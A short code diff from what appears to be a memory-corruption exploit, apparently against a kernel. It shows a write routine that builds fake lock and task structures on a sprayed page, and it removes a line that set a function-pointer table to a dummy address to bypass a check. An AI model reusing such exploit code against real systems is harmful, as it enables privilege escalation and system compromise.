@@ -271,8 +271,6 @@ static int do_one_write(uintptr_t target, const char *desc, int mode) {
     fake_lock = page_base;
     fake_w0 = page_base + 0x40;
     fake_task = 0;
-    extern uintptr_t fops;
-    fops = page_base; // Dummy deger: kontrolu gecmek icin
     
   }
   TIMER("  heap spray done");
